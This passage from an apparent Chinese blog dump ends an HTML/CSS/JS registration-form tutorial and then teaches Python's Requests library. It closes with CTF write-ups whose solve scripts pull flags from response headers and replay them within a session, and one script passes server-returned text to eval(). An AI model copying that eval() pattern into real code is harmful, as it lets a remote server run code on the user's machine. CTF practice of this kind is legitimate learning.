/> 厘米\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">体重：</span>\n\t\t\t\t<input type=\"range\" class=\"item-inp\" name=\"user_weight\" min=\"45\" max=\"90\" value=\"55\" step=\"2\" /> 千克\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">出生日期：</span>\n\t\t\t\t<input type=\"date\"  class=\"item-inp\" name=\"user_birthday\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">电话号码：</span>\n\t\t\t\t<input type=\"tel\" class=\"item-inp\" name=\"user_tel\" pattern=\"\\d{11}\" placeholder=\"请输入11手机号码\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">E-mail：</span>\n\t\t\t\t<input type=\"email\" class=\"item-inp\" name=\"user_email\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">个人主页：</span>\n\t\t\t\t<input type=\"url\" class=\"item-inp\" name=\"user_homepage\" autocomplete=\"off\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">家庭住址：</span>\n\t\t\t\t<select class=\"item-inp\" name=\"user_address\" >\n\t\t\t\t\t<option value=\"0\" >北京</option>\n\t\t\t\t\t<option value=\"1\" >上海</option>\n\t\t\t\t\t<option value=\"2\" selected>成都</option>\n\t\t\t\t</select>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">邮政编码：</span>\n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_zipcode\" pattern=\"[0-9]{6}\" placeholder=\"请输入6位邮政编码\" />\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">最爱的颜色：</span>\n\t\t\t\t\t<input type=\"color\" class=\"item-inp\" name=\"user_color\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">喜欢的运动：</span>\n\t\t\t\t<input type=\"checkbox\" name=\"user_habit\" value=\"篮球\"/><span>篮球</span>\n\t\t\t    <input type=\"checkbox\" name=\"user_habit\" value=\"足球\" checked><span>足球</span>\n\t\t\t    <input type=\"checkbox\" name=\"user_habit\" value=\"游泳\"><span>游泳</span>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">喜欢的网站：</span>\n\t\t\t\t<input type=\"url\" class=\"item-inp\" name=\"user_favurl\" list=\"urllist\"/>\n\t\t\t\t<datalist id=\"urllist\" >\n\t\t\t\t\t\t<option label=\"百度\" value=\"http://www.baidu.com\"/>\n\t\t\t\t\t\t<option label=\"新浪\" value=\"http://www.sina.com\"/>\n\t\t\t\t\t\t<option label=\"谷歌\" value=\"http://www.google.com\"/>\n\t\t\t\t\t\t<option value=\"http://www.163.com\">网易</option>\n\t\t\t\t</datalist>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">生活照2张：</span>\n\t\t\t\t<input type=\"file\" class=\"item-inp\" name=\"user_album\"  multiple/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">个人自述：</span>\n\t\t\t\t\t<textarea name=\"info\" rows=\"5\" cols=\"50\">我是一位特别热爱学习的好孩子。。。</textarea>\n\t\t\t</div>\n\t\t\t\t\n\t\t\t\t<input type=\"hidden\" name=\"user_secret\" value=\"7\"/>\n\t\t\t\t\n\t\t\t<div class=\"info-item\" style=\"text-align:center;\">\n\t\t\t\t\t<input type=\"button\" class=\"item-bt\" value=\"注册\" onClick=\"validate()\" style=\"margin-right:100px;\"/>   <input type=\"reset\" class=\"item-bt\" value=\"重置\" />\n\t\t\t</div>\n\t\t\t\t\t<hr noshade size=\"1\" width=\"99%\">\n\t\t\t\n\t\t\t\t<ul class=\"info-item\">\n\t\t\t\t\t\t<li><a href=\"tel:10086\">电话</a></li>\n\t\t\t\t\t\t<li><a href=\"sms:10086\">短信</a></li>\n\t\t\t\t\t\t<li><a href=\"mailto:10086@sina.com\">E-mail</a></li>\n\t\t\t\t\t\t<li><a href=\"#title\">返回顶部</a></li>\n\t\t\t\t</ul>\n\t</form>\n\t</div>\t\n</body>\n</html>\n```\n\n#### Register.css\n\n```css\n@charset \"utf-8\";\n*{\n\t\tfont-size:13px;\n\t}\na {\ntext-decoration: none;\n}\na:link {\n\tcolor: blue;\n}\na:visited {\n\tcolor: gray;\n}\na:hover {\n\tcolor: red;\n}\na:active {\n\tcolor: yellow;\n}\n#wrapper {\n\twidth: 95%;\n\tmin-width: 400px;\n\tmax-width: 700px;\n\tmargin: 10px auto;\n\tpadding-top:5px;\n\tborder: 1px solid #ccc;\n\tbackground-color: #eee;\n\tletter-spacing: 0.2em;\n}\n\n#title {\n\ttext-align: center;\n\tcolor: transparent;\n\tfont-size: 1.5em;\n\tfont-weight: bolder;\n\tmargin: 10px;\n\t/*border: 1px solid red;*//*设置边框便于布局测试*/\n\ttext-shadow: 0 0 rgba(0,0,255,0.7),  \n\t\t\t\t -0.1em -0.1em 0.2em rgba(255,0,0,0.5),  \n\t\t\t\t 0.1em 0.1em 0.2em rgba(0,255,0,0.5);\n}\n#title:target{/*返回顶部时改变title字体颜色*/\n\tcolor:red;\n}\n\n.info-item{\n\tmargin: 10px;\n\tpadding: 3px;\n\t/*border: 1px solid green;*/\n\tborder-radius: 10px/6px;\n\tbackground-color: rgba(204,204,204,0.4);\n}\n.item-name {\n\twidth: 32%;\n\tdisplay: inline-block;\n\ttext-align: right;\n\tvertical-align: middle;/*文本和输入域均设置垂直居中对齐*/\n}\n.item-inp{\n\twidth: 40%;\n\tbox-sizing:border-box;/*否则设置了背景图像的输入域因padding-left而变宽*/\n\tdisplay: inline-block;\n\tvertical-align: middle;\n\tmargin-right:0.5em;\n}\n\n/*带有背景图像的输入域样式设计*/\n.info-item:nth-child(1) input{\n\tbackground: url(../image/name.gif) no-repeat;\n\tbackground-color: white;/*设置背景图像后，默认的背景色将会是父元素的背景色（如果存在，否则背景色透明）*/\n\tpadding-left: 20px;/*使得content输入区在背景图像右边*/\n\tborder: 1px solid #ccc;/*如果不重定义边框，则会因为背景图像的影响而出现立体边框*/\n\t\n}\n.info-item input[type=\"password\"] {\n\tbackground: url(../image/password.gif) no-repeat;\n\tbackground-color: white;\n\tpadding-left: 20px;\n\tborder: 1px solid #ccc;/*如果不重定义边框，则会因为背景图像的影响而出现立体边框*/\n}\n\ninput:checked+span,input:checked+label {/*设置被选中的单选按钮和复选框后的文字的颜色*/\n\tcolor: red;\n}\ntextarea{\n\twidth:60%;\n\tvertical-align:middle;\n}\n\n/*设置导航链接的样式*/\n\nul, li {\n\tbox-sizing: border-box;\n\tborder-radius: 10px/6px;\n\tbackground-color: rgba(204,204,204,0.4);\n}\nul {\n\tlist-style: none;\n\ttext-align:center;\n}\nli {\n\twidth: 22%;\n\tdisplay:inline-block;\n}\nli:nth-child(odd):hover {\n\ttransition: transform 1s ease-in-out;\n\ttransform: scale(1.2) rotate(-15deg);\n}\nli:nth-child(even):hover {\n\ttransition: transform 1s ease-in-out;\n\ttransform: scale(1.2) skew(30deg);\n}\n\n.star{color:#F00;}\n```\n\n#### Register.js\n\n```javascript\nfunction changeStatus(obj){\n    //方法一：通过节点关系\n    /*if(obj.value!=null&&obj.value.trim()!=\"\")//不全为空格时\n\t\t\t\tobj.nextSibling.style.color=\"#333\";\n\t\t\telse\n\t\t\t\tobj.nextSibling.style.color=\"#F00\";*/\n\n    //方法二：通过节点列表及两类节点的对应关系\n    var objs = document.getElementsByClassName(\"item-inp\");\n    var stars = document.querySelectorAll(\".star\");\n    for(var i=0;i<4;i++){\n        obj = objs[i];\n        if(obj.value!=null&&obj.value.trim()!=\"\")\n            stars[i].style.color=\"#333\";\n        else\n            stars[i].style.color=\"#F00\";\n    }\n}\nfunction validate(){\n    var allinfos = \"\";\n\n    var user_name=document.forms[0].user_name.value.trim();//\n    allinfos+=\"姓名：\"+user_name+\"\\n\";//加换行\n    var user_id=document.forms[0].user_id.value.trim();//\n    allinfos+=\"学号：\"+user_id+\"\\n\";//加换行\n    var user_sex = document.regForm.user_sex.value.trim();\n    allinfos+=\"性别：\"+user_sex+\"\\n\";//加换行\n    var user_address = document.regForm.user_address;\n    allinfos+=\"住址：\"+user_address.options[user_address.selectedIndex].innerText+\"\\n\";\n    var user_habit = document.regForm.user_habit;\n    allinfos+=\"爱好：\";\n    for (var i = 0; i < user_habit.length; i++) {\n        if (user_habit[i].checked) {\n            allinfos+=user_habit[i].value+ \"、\";\n        }\n    }\n    allinfos = allinfos.substring(0,allinfos.length-1);//删除最后一个空格字符\n    //document.regForm.info.value = allinfos;\n    var resp = window.confirm(allinfos+\"\\n\\n请核对以上信息是否正确？\\n\\n单击'确定'继续，否则取消\");\n\n    if(resp==false) return;\n\n\n    var user_pwd1=document.forms[0].user_pwd1.value.trim();\n    var user_pwd2=document.forms[0].user_pwd2.value.trim();\n    var user_tel=document.forms[0].user_tel.value.trim();\n    var user_email=document.forms[0].user_email.value.trim();\n\n    document.forms[0].user_name.value = user_name;//向服务器提交去掉空格后的用户名\n\n    if(user_name.length<=0)\n        alert(\"用户名不能为空！\");  \n    else if(user_pwd1.length<8)\n        alert(\"密码长度必须为8位！\");  \n    else if(user_pwd2==\"\")\n        alert(\"请输入确认密码！\");\n    else if(user_pwd1!=user_pwd2)\n        alert(\"两次密码不一致！\"); \n    else  if(user_tel.length!=11)\n        alert(\"手机号必须为11位！\");\n    else  if(!checkNum(user_tel))\n        alert(\"手机号必须为数字！\");\n    else if(user_email.indexOf(\"@\")<1||user_email.indexOf(\"@\")==user_email.length-1||user_email.indexOf(\"@\")!=user_email.lastIndexOf(\"@\"))\n        alert(\"邮件格式不正确！\");\n    else  \n        document.forms[0].submit(); \n}\n\nfunction checkNum(num){//检测电话号码的每一位是否是数字字符，方法一\n    var isNum = true;\n    for(i=0;i<num.length;i++)\n    {\n        if(isNaN(num.charAt(i)))\n        {\n            isNum = false;\n            break;\n        }\n    }\n    return isNum;\n}\n\t\t\nfunction checkNum2(num){//检测电话号码的每一位是否是数字字符，方法二\n    var isNum = false;\n    for(i=0;i<num.length;i++)\n    {\n        if(num.charAt(i)-'0' >=0 && num.charAt(i)-'0' <=9)\n        {\n            isNum = true;\n        }\n        else\n            isNum = false;\n    }\n    return isNum;\n}\n```\n\n## 一些实用例子\n\n### 透明效果\n\n```css\nstyle=\"background-color:rgba(0,0,0,0);\"\n```\n\n### 页面滚动到指定位置\n\n```html\n<!DOCTYPE html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<title>js平滑滚动到顶部、底部、指定地方</title>\n<script type=\"text/javascript\" src=\"http://cdn.staticfile.org/jquery/2.1.1-rc2/jquery.min.js\"></script>\n<style>\n .box{ height:200px; width:100%; background:#ccc; margin:10px 0;}\n .location{ position:fixed; right:0; bottom:10px; width:20px; background:#FFC; padding:5px; cursor:pointer;color:#003};\n</style>\n</head>\n<body>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box a\">产品介绍产品介绍产品介绍产品介绍产品介绍产品介绍产品介绍产品介绍产品介绍产品介绍产品介绍产品介绍产品介绍</div>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box bottom\"></div>\n<div class=\"location\">\n  <p class=\"scroll_top\">返回顶部</p>\n  <p class=\"scroll_a\">产品介绍</p>\n  <p class=\"scroll_bottom\">滑到底部</p>\n</div>\n<script type=\"text/javascript\">\n jQuery(document).ready(function($){\n  $('.scroll_top').click(function(){$('html,body').animate({scrollTop: '0px'}, 800);}); \n  $('.scroll_a').click(function(){$('html,body').animate({scrollTop:$('.a').offset().top}, 800);});\n  $('.scroll_bottom').click(function(){$('html,body').animate({scrollTop:$('.bottom').offset().top}, 800);});\n });\n</script>\n</body>\n</html>\n```\n\n","tags":["Web"],"categories":["JavaWeb"]},{"title":"Python模块-Requests学习与CTF和AWD实战","url":"/posts/57181.html","content":"![](https://img.jwt1399.top//img/20200824173112.png)\n\n>Requests is the only Non-GMO HTTP library for Python, safe for human consumption.\n\n## 前言\n\n为什么学习`Requests`模块呢，因为最近老是遇见它，自己又不太懂，加之在很多`Web`的`poc`里面`Requests`模块的出镜率很高，于是特此学习记录之。\n\n## 简介\n`Requests`是一个简单方便的`HTTP 库`。比`Python`标准库中的`urllib2`模块功能强大。Requests 使用的是 urllib3，因此继承了它的所有特性。Requests 支持使用`cookie` 保持会话，支持文件上传，支持自动确定响应内容的编码，支持`URL` 和 `POST` 数据自动编码。帮助我们轻松解决关于`HTTP`的大部分问题。\n\n## 安装\n**方法一**：\n只要在你的终端中运行这个简单命令即可：\n\n```\n$ pip install requests\n```\n如果你没有安装`Python`，这个 [Python installation guide](https://docs.python-guide.org/starting/installation/) 可以带你完成这一流程。\n\n**方法二**\n你可以克隆公共版本库：\n```\ngit clone git://github.com/kennethreitz/requests.git\n```\n获得代码之后，你就可以轻松的将它嵌入到你的 python 包里\n```\ncd requests\npython setup.py install\n```\n或者放到你的`Python27\\Lib\\site-packages`目录下\n\n能导入requests，即安装成功\n```python\n>>> import requests\n```\n## Requests常用方法\n所有示例都是以Github官网（https://github.com/）为例\n### 发送请求\n发起`GET`请求;\n```python\n>>> r = requests.get('https://github.com/')\n```\n发起`POST`请求：\n```python\n>>> r = requests.post('https://github.com/post', data = {'key':'value'})\n```\n其他` HTTP` 请求类型：`PUT，DELETE，HEAD 以及 OPTIONS`,都是一样的简单\n```python\n>>> r = requests.put('https://github.com/', data = {'key':'value'})\n>>> r = requests.delete('https://github.com/delete')\n>>> r = requests.head('https://github.com//get')\n>>> r = requests.options('https://github.com/get')\n```\n现在，我们有一个名为` r `的` Response `对象。我们可以从这个对象中获取所有我们想要的信息。\n### 查看请求头\n以查看`GET`请求的请求头为例，`POST`请求同理：\n```python\n>>> r = requests.get('https://github.com/')\n>>> r.request.headers\n{'Connection': 'keep-alive', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'python-requests/2.22.0'}\n```\n查看请求头的某一属性：(大小写不影响)\n```python\n>>> r.request.headers['Accept-Encoding']\n'gzip, deflate'\n>>> r.request.headers.get('user-agent')\n'python-requests/2.22.0'\n```\n### 查看响应头\n查看GET请求的响应头为例，POST请求同理：\n```python\n>>> r = requests.get('https://github.com/')\n>>> r.headers\n{'Status': '200 OK', 'Expect-CT': 'max-age=2592000, report-uri=\"https://api.github.com/_private/browser/errors\"', 'X-Request-Id': '45a5c520-bb73-4677-b30c-19300dcf6f38', 'X-XSS-Protection': '1; mode=block', 'Content-Security-Policy': \"default-src 'none'; base-uri 'self'; block-all-mixed-content; ......}\n```\n查看响应头的某一属性：(大小写不影响)\n```python\n>>> r.headers['Status']\n'200 OK'\n>>>r.headers.get('content-type')\n'text/html; charset=utf-8'\n```\n### 查看响应内容\n查看服务器返回页面的内容，以查看GET请求的响应内容为例，POST请求同理：\n```python\n>>> r = requests.get('https://github.com/')\n>>> r.text\nu'\\n\\n\\n\\n\\n\\n<!DOCTYPE html>\\n<html lang=\"en\">\\n  <head>\\n    <meta charset=\"utf-8\">\\n...\n```\n`Requests` 会自动解码来自服务器的内容。大多数 `unicode` 字符集都能被无缝地解码。\n\n请求发出后，`Requests` 会基于 `HTTP` 头部对响应的编码作出有根据的推测。当你访问 `r.text` 之时，`Requests` 会使用其推测的文本编码。你可以找出 `Requests` 使用了什么编码，并且能够使用`r.encoding` 属性来改变它：\n```python\n>>> r.encoding\n'utf-8'\n>>> r.encoding = 'ISO-8859-1'\n```\n### 二进制响应内容\n你也能以字节的方式访问请求响应体，对于非文本请求：\n```python\n>>> r.content\nb'[{\"repository\":{\"open_issues\":0,\"url\":\"https://github.com/...\n```\nRequests 会自动为你解码 gzip 和 deflate 传输编码的响应数据。\n\n例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码：\n```python\n>>> from PIL import Image\n>>> from io import BytesIO\n>>> i = Image.open(BytesIO(r.content))\n```\n### 传递GET请求参数\nGET请求参数作为查询字符串附加在URL末尾，可以通过`requests.get()`方法中的`params`参数(`dict`类型变量)完成。例如，我要构建的URL为`https://github.com/?username=jwt&id=1`，则可以通过以下代码传递`GET`请求参数：\n```python\n>>> args = {'username': 'jwt', 'id': 1}\n>>> r = requests.get('https://github.com/', params = args)\n>>> print(r.url)\nhttps://github.com/?username=jwt&id=1\n```\n### 传递POST请求参数\n\n`POST`请求参数以表单数据的形式传递，可以通过`requests.post()`方法中的`data`参数(dict类型变量)或者`json`参数完成，由于github官网POST请求参数不以明文展现，此处改为了其他网站测试\n\n#### 使用data参数\n\n具体代码如下：\n\n```python\n>>> args = {'username': 'jwt', 'id': 1}\n>>> r = requests.post(\"http://httpbin.org/post\", data=args)\n>>> print(r.text)\n{\n  \"args\": {},\n  \"data\": \"\",\n  \"files\": {},\n  \"form\": {\n    \"id\": \"1\",\n    \"username\": \"jwt\"\n  },\n  \"headers\": {\n    \"Accept\": \"*/*\",\n    \"Accept-Encoding\": \"gzip, deflate\",\n    \"Content-Length\": \"17\",\n    \"Content-Type\": \"application/x-www-form-urlencoded\",\n    \"Host\": \"httpbin.org\",\n    \"User-Agent\": \"python-requests/2.22.0\"\n  },\n  \"json\": null,\n  \"origin\": \"3.112.219.149, 3.112.219.149\",\n  \"url\": \"https://httpbin.org/post\"\n    \n```\n#### 使用json参数\n\n这里就记录一下如何用requests发送json格式的数据，因为一般我们post参数，都是直接post，没管post的数据的类型，此时其默认类型为：\n\n```\napplication/x-www-form-urlencoded\n```\n\n但是，我们写程序的时候，最常用的接口post数据的格式是json格式。当我们需要post json格式数据的时候，怎么办呢，有两种方法：\n\n##### 1，在header中指定数据类型\n\n详见如下代码:\n\n```python\nimport requests\nimport json\n \ndata = {\n    'a': 123,\n    'b': 456\n}\n \n## headers中添加上content-type这个参数，指定为json格式\nheaders = {'Content-Type': 'application/json'}\n \n## post的时候，将data字典形式的参数用json包转换成json格式。\nresponse = requests.post(url='url', headers=headers, data=json.dumps(data))\n```\n\n##### 2，直接使用json参数\n\n现在较新版本的requests的post方法，已经默认提供一个json的参数，直接传入字典数据，自动完成以上的传话，使用json格式传输数据。\n\n代码如下：\n\n```python\nimport requests\n \ndata = {\n    'a': 123,\n    'b': 456\n}\n \n## post的时候，使用json参数\nresponse = requests.post(url='url', json=data)\n```\n\n就可以发送json格式数据了。\n\n参考：[python 使用requests发送json格式数据](https://amos-x.com/index.php/amos/archives/python-requests-send-json/)\n\n### 传递Cookie参数\n\n>HTTP 协议是无状态的。因此，若不借助其他手段，远程的服务器就无法知道以前和客户端做了哪些通信。Cookie 就是手段之一。\n>Cookie 用于记录用户在网站上的登录状态。\n\n如果想传递自定义`Cookie`到服务器，可以使用`cookies`参数(`dict`类型变量)。以`POST`请求为例提交自定义`Cookie`（`cookies`参数同样适用于`GET`请求）：\n```python\n>>> mycookie = {'userid': '123456'}\n>>> r = requests.post('https://github.com/', cookies = mycookie)\n>>> r.request.headers\n...'Cookie': 'userid=123456',...\n```\n### 会话对象Session（）\n>会话是存储在服务器上的相关用户信息，用于在有效期内保持客户端与服务器之间的状态.Session与Cookie配合使用，当会话或Cookie失效时，客户端与服务器之间的状态也随之失效。\n\n请求模块中的会话对象Session（）能够在多次请求中保持某些参数，使得底层的TCP连接将被重用，提高了HTTP连接的性能。\n\nSession（）的创建过程如下：\n```python\n>>> s = requests.Session()\n```\n在有效期内，同一个会话对象发出的所有请求都保持着相同的Cookie，可以看出，会话对象也可以通过get与post方法发送请求，以发送GET请求为例：\n```python\n>>> r = s.get('https://github.com)\n```\n我们来跨请求保持一些 cookie:\n```python\ns = requests.Session()\n\ns.get('http://httpbin.org/cookies/set/sessioncookie/123456789')\nr = s.get(\"http://httpbin.org/cookies\")\n\nprint(r.text)\n# '{\"cookies\": {\"sessioncookie\": \"123456789\"}}'\n```\n\n任何你传递给请求方法的字典都会与已设置会话层数据合并。方法层的参数覆盖会话的参数。\n\n不过需要注意，就算使用了会话，方法级别的参数也不会被跨请求保持。下面的例子只会和第一个请求发送 cookie ，而非第二个：\n```python\ns = requests.Session()\n\nr = s.get('http://httpbin.org/cookies', cookies={'from-my': 'browser'})\nprint(r.text)\n# '{\"cookies\": {\"from-my\": \"browser\"}}'\n\nr = s.get('http://httpbin.org/cookies')\nprint(r.text)\n# '{\"cookies\": {}}'\n```\n### Cookie和Session区别\n1.session 在服务器端，cookie 在客户端（浏览器）\n2.session 默认被保存在服务器的一个文件里（不是内存）\n3.session 的运行依赖 session id，而 session id 是存在 cookie 中的，也就是说，如果浏览器禁用了 cookie ，同时 session 也会失效（但是可以通过其它方式实现，比如在 url 中传递 session_id）\n4.session 可以放在 文件、数据库、或内存中都可以。\n5.用户验证这种场合一般会用 session\n6.cookie目的可以跟踪会话，也可以保存用户喜好或者保存用户名密码\n7.session用来跟踪会话\n![利用 Cookie 管理 Session](https://i.loli.net/2019/08/08/CxvezroEm3OAQ26.png)\n\n### HTTP代理\n如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求:\n```python\nimport requests\n\nproxies = {\n  \"http\": \"http://10.10.1.10:3128\",\n  \"https\": \"http://10.10.1.10:1080\",\n}\n\nrequests.get(\"http://example.org\", proxies=proxies)\n```\n你也可以通过环境变量 `HTTP_PROXY` 和` HTTPS_PROXY `来配置代理。\n```python\n$ export HTTP_PROXY=\"http://10.10.1.10:3128\"\n$ export HTTPS_PROXY=\"http://10.10.1.10:1080\"\n\n$ python\n>>> import requests\n>>> requests.get(\"http://example.org\")\n```\n若你的代理需要使用`HTTP Basic Auth`，可以使用 `http://user:password@host/`语法：\n```python\nproxies = {\n    \"http\": \"http://user:pass@10.10.1.10:3128/\",\n}\n```\n要为某个特定的连接方式或者主机设置代理，使用 `scheme://hostname` 作为 `key`， 它会针对指定的主机和连接方式进行匹配。\n```python\nproxies = {'http://10.20.1.128': 'http://10.10.1.10:5323'}\n```\n注意，代理 `URL` 必须包含连接方式。\n\n### SOCKS代理\n\n除了基本的 HTTP 代理，Request 还支持 SOCKS 协议的代理。这是一个可选功能，若要使用， 你需要安装第三方库。\n\n你可以用 pip 获取依赖:\n```\n$ pip install requests[socks]\n```\n安装好依赖以后，使用 SOCKS 代理和使用 HTTP 代理一样简单：\n```\nproxies = {\n    'http': 'socks5://user:pass@host:port',\n    'https': 'socks5://user:pass@host:port'\n}\n```\n## Request在CTF中实战\n### 题目 天下武功唯快不破\n题目来源：实验吧\n题目链接：http://ctf5.shiyanbar.com/web/10/10.php\n题目信息：\n![](https://i.loli.net/2019/08/08/1lNP4u2rGeb6Foh.png)\n打开题目，查看源码\n![](https://i.loli.net/2019/08/08/p4c3WLrZNVbKlOo.png)\n题目提示请用`POST`请求提交你发现的信息，请求参数的键值是`key`。看看响应头，果然看到FLAG\n![](https://i.loli.net/2019/08/08/RTmZDJEC9Q84Luz.png)\n将发现字符base64解码：`P0ST_THIS_T0_CH4NGE_FL4G:x63HymPc3`\n![](https://i.loli.net/2019/08/08/PvYTriwqSd1Wjf2.png)\n即`key=x63HymPc3`\nHackbar手工提交 POST 请求会有什么效果：\n![](https://i.loli.net/2019/08/08/qg9uGRwPW7svBNO.png)\n根据题目意思必须很快的提交，经过研究发现FLAG的值会改变，显然必须要用脚本来跑了，因此直接上 Python 脚本解题：\n\n```python\n# -*- coding: utf-8 -*-\n# python 2\nimport requests\nimport base64\nurl = \"http://ctf5.shiyanbar.com/web/10/10.php\" # 目标URL\nheaders = requests.get(url).headers # 获取响应头\nkey = base64.b64decode(headers['FLAG']).split(':')[1] # 获取响应头中的Flag，用 split(':') 分离冒号两边的值，对象中的第二个元素即为要提交的 key 值\npostData = {'key': key} # 构造Post请求体\nprint(requests.post(url, data = postData).text)# 利用Post方式发送请求并打印响应内容 \n```\n运行脚本，得到flag\n![](https://i.loli.net/2019/08/08/4BHYIawCf1KnPvM.png)\n\n### 题目 速度要快\n题目来源：bugku\n题目链接：http://123.206.87.240:8002/web6/\n题目信息：\n![](https://i.loli.net/2019/08/08/6sDuXIikrfQw1bV.png)\n>此题是上一题的升级版，除了要求快速发送`POST`请求，还要求所有的请求必须在同一个`Session`内完成\n\n打开题目，查看源码\n![](https://i.loli.net/2019/08/08/MYZlHAX3TQmiCbk.png)\n题目提示请用`POST`请求提交你发现的信息，请求参数的键值是`margin`。看看响应头，果然看到flag\n![](https://i.loli.net/2019/08/08/c4uTHyePG7RbAkz.png)\n将发现字符base64解码：`跑的还不错，给你flag吧: MzIyMTk1`\n![](https://i.loli.net/2019/08/08/tLUBo3u6A1CTSnP.png)\n经过第一次base64解码后，flag仍然还是一段base64编码，所以要再解码一次。解题过程中，要自行动手查看每一次解码后的值，才能选择合适的方法去获得最终key值。\n![](https://i.loli.net/2019/08/08/Ro8YkHwaBJC6Mul.png)\nHackbar手工提交 POST 请求会有什么效果:\n![](https://i.loli.net/2019/08/08/bMm9OkgixA2lPU3.png)\n根据题目意思必须很快的提交，经过研究发现flag的值会改变，显然必须要用脚本来跑了，因此直接上 Python 脚本解题\n但是直接用上题脚本发现，发现还是提示快一点\n因此查看GET请求和POST请求的`请求头`与`响应头`是否内有玄机\n![](https://i.loli.net/2020/05/20/LwF4Kk3bJNmXvqs.png)\n果然如此，GET请求和POST请求的响应头的Set-Cookie值不相同，即不在同一个会话中，因此编写脚本\n**方法一**：\n\n```python\n# -*- coding: utf-8 -*-\n# python 2\nimport requests\nimport base64\nurl = 'http://123.206.87.240:8002/web6/'\ns = requests.Session() #获取 Session\nheaders = s.get(url).headers\nkey = base64.b64decode(base64.b64decode(headers['flag']).split(\":\")[1])\npost = {\"margin\":key} \nprint(s.post(url, data = post).text)\n```\n用会话对象Session()的get和post方法使GET请求与POST请求在同一个Session中\n\n运行脚本，得到flag\n![](https://i.loli.net/2019/08/08/zkJerUat28BfyA9.png)\n**方法二**：\n既然只需要保持两次请求中 Cookie 属性相同，那能不能构造 Cookie 属性通过普通的 get 与 post 方法完成呢？答案是可以的。请见如下代码：\n\n```python\n# -*- coding: utf-8 -*-\n# python 2\nimport requests\nimport base64\nurl = 'http://120.24.86.145:8002/web6/'\nheaders = requests.get(url).headers\nkey = base64.b64decode(base64.b64decode(headers['flag']).split(\":\")[1])\npost = {\"margin\": key} \nPHPSESSID = headers[\"Set-Cookie\"].split(\";\")[0].split(\"=\")[1]\ncookie = {\"PHPSESSID\": PHPSESSID}\nprint(requests.post(url, data = post, cookies = cookie).text)\n```\n### 题目 秋名山老司机\n题目来源：bugku\n题目链接：http://123.206.87.240:8002/qiumingshan/\n题目信息：\n![](https://i.loli.net/2020/05/20/pZaRetgBlxoy2mJ.png)\n\n>依旧是跟前两题差不多，前面两题均是对响应头中与flag相关的属性做解码处理，然后快速发送一个 POST 请求得到 flag 值。而本题要求计算响应内容中的表达式，将结果用 POST 请求发送回服务器换取 flag 值。同样要利用会话对象 Session()，否则提交结果的时候，重新生成了一个新的表达式，结果自然错误。\n\n打开题目，查看源码\n![](https://i.loli.net/2020/05/20/VzFaq1GSdIZ4uUO.png)\n根据题目意思 必须2秒内计算给出算式的值\n但是不知道POST的key是什么，刷新页面再看看，得到请求参数的 key 值为`value`\n![](https://i.loli.net/2020/05/20/UJlxr18MNpqyTWg.png)\n经过研究发现算式会改变，再加上必须2秒内提交，显然必须要用脚本来跑了，因此直接上 Python 脚本解题\n\n```python\n# -*- coding: utf-8 -*-\n# python 2\nimport requests\nimport re # 正则表达式\nurl = 'http://123.206.87.240:8002/qiumingshan/'\ns = requests.Session()\nr = s.get(url).content\n# search() 匹配算术表达式，匹配成功后用 group() 返回算术表达式的字符串。\nexpression = re.search(r'(\\d+[+\\-*])+(\\d+)', r).group() # search() 的第一个参数是匹配的正则表达式，第二个参数是要匹配的字符串\nsum = eval(expression) # eval()自动计算出结果，\npost = {'value': sum}\nprint (s.post(url, data = post).content.decode('utf-8'))\n```\n**脚本解释**：\n```python\nexpression = re.search(r'(\\d+[+\\-*])+(\\d+)', r).group() \n```\n前面的一个`r`表示字符串为非转义的原始字符串，让编译器忽略反斜杠，也就是忽略转义字符。但是这个字符串里没有反斜杠，所以这个`r`可有可无\n\n`\\d+`代表一个或多个数字\n`[+\\-*]`匹配一个加号，或一个减号，或一个乘号，注意减号在中括号内是特殊字符，要用反斜杠转义；\n`(\\d+[+\\-*])+`代表一个或多个由数字与运算符组成的匹配组；最后再加上剩下的一个数字`(\\d+)`\n\n[Python 正则表达式](https://www.runoob.com/python/python-reg-expressions.html)\n[正则表达式](https://docs.python.org/zh-cn/2.7/library/re.html)\n运行脚本，就有一定的概率可以获得flag,经尝试与猜测只有当`Give me value post about...`界面出现提交才能得到flag\n所以多运行几次脚本flag就能得到了\n\n![](https://i.loli.net/2020/05/20/yctYRWMpibT1wHP.png)\n\n\n### 题目 快速口算\n\n题目来源：网络信息安全攻防学习平台\n题目链接：http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php\n题目信息：\n![](https://i.loli.net/2020/05/20/xkZeTPyhrtK7Opb.png)\n\n>跟上一题原理一样，唯一不同就是正则表达式稍有变动，因为两题算式形式略有不同\n\n打开题目，查看源码\n![](https://i.loli.net/2020/05/20/YmG8RXtfcyETKhM.png)\n根据题目意思 必须2秒内计算给出算式的值，源码中得到请求参数的 key 值为`v`\n解题脚本：\n\n```python\n# -*- coding: utf-8 -*-\n# Python 2\nimport requests\nimport re # 